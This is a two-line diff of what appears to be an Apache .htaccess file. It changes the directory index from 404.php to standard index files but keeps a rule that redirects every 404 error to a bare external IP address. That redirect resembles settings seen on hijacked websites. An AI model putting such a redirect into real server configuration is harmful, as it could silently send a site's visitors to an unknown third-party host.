@@ -1,2 +1,2 @@
-DirectoryIndex 404.php
+DirectoryIndex index.php index.htm index.html 404.php
 ErrorDocument 404 http://202.89.41.210/
